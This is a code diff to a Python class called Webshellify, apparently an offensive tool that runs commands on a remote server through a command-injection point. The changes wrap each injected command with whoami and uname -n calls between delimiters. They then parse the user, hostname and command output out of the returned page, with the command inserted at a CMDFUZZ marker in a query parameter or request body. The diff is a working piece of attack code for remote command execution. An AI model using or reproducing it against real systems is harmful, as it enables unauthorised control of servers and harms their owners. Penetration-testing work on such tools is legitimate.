@@ -59,20 +59,56 @@ class Webshellify:
         self.queries = {}
         self.cmd_fuzz = "CMDFUZZ"
 
-    def __gen_command(self, command):
-        return f"echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'"
+    """
+    Generates the given command into a form that can be easily extracted from
+    the response.
 
+    This command may contain additional command calls to determine additional
+    information of the current user and machine name
+    """
+    def __gen_command(self, command):
+        return f"""
+            echo '`{self.delimiter}-user`'; whoami; echo '`/{self.delimiter}-user`';
+            echo '`{self.delimiter}-host`'; uname -n; echo '`/{self.delimiter}-host`'
+            echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'
+            """
+
+    """
+    Extracts the output from the command call from the page results
+
+    this will return the current user, hostname and command response.
+    """
     def __extract_output(self, raw):
-        regex_form = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
-        output_re = re.compile(regex_form)
+        user_regex = f"`{self.delimiter}-user`\n((.*\n)*)`\/{self.delimiter}-user`"
+        host_regex = f"`{self.delimiter}-host`\n((.*\n)*)`\/{self.delimiter}-host`"
+        output_regex = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
+        user_re = re.compile(user_regex)
+        host_re = re.compile(host_regex)
+        output_re = re.compile(output_regex)
         if(self.debug):
             print(f"""[debug] in funct `__extract_output`
 raw: {raw}
-regex: {regex_form}
+user regex: {user_regex}
+match: {user_re.findall(raw)}
+host regex: {host_regex}
+match: {host_re.findall(raw)}
+output regex: {output_regex}
 match: {output_re.findall(raw)}""")
+        user = user_re.findall(raw)[0][0]
+        host = host_re.findall(raw)[0][0]
         output = output_re.findall(raw)[0][0]
-        return output
+        return user, host, output
 
+    """
+    Sends an individual command in isolation to the host and path initialized.
+
+    This requires a preset location for the command to be inserted into the
+    request. This requires the command fuzz keyword to be placed in either a
+    query paramter or the request body
+
+    This function will also return the name of the host, name of the current
+    user and the output of the previous command
+    """
     def send_command(self, command):
         cmd = self.__gen_command(command)
         # generate query
